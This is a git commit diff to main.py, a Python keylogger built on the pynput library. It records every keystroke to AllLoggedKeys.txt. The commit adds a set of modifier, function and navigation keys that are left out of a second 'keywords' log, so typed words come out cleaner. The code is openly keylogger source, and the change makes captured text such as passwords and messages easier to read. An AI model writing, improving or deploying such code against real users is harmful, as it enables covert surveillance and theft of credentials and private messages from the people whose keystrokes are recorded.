dcaf458d4ab1a75a71c9f32cf3f04ea90503f3a6
Omar <oh777889@gmail.com>
2025-01-27 20:43:00 +0200

    updated keywordslogs functionallity

--- main.py
+++ main.py
@@ -3,9 +3,38 @@ from pynput import keyboard
 
 Allkeylogsfile=open("AllLoggedKeys.txt",'a')
 keyWordslogs=open("LoggedKeyWords.txt",'a')
+
 keys=[]
 word_Keys=[]
 
+#these will be excluded ONLY from loggedKeyWord.txt but will be available in AllLoggedkeys.txt
+Excluded_Keys = {
+    keyboard.Key.shift_l,
+    keyboard.Key.ctrl_l,
+    keyboard.Key.ctrl_r,
+    keyboard.Key.alt_l,
+    keyboard.Key.alt_r,
+    keyboard.Key.cmd,
+    keyboard.Key.tab,
+    keyboard.Key.caps_lock,
+    keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3, keyboard.Key.f4, 
+    keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8, 
+    keyboard.Key.f9, keyboard.Key.f10, keyboard.Key.f11, keyboard.Key.f12,
+    keyboard.Key.print_screen,
+    keyboard.Key.scroll_lock,
+    keyboard.Key.pause,
+    keyboard.Key.insert,
+    keyboard.Key.home,
+    keyboard.Key.page_up,
+    keyboard.Key.page_down,
+    keyboard.Key.end,
+    keyboard.Key.delete,
+    keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right,
+    keyboard.Key.media_volume_up,
+    keyboard.Key.media_volume_down,
+    keyboard.Key.media_play_pause,
+    keyboard.Key.esc
+}
 
 
 def pressed(key):
@@ -29,7 +58,11 @@ def pressed(key):
         else:
                 print(f'Special key {key} pressed')
                 keys.append(f"<{key}>")
-                word_Keys.append(f"<{key}>")
+                
+                if(key in Excluded_Keys):
+                    return
+                else:    
+                 word_Keys.append(f"<{key}>")
 
 
 
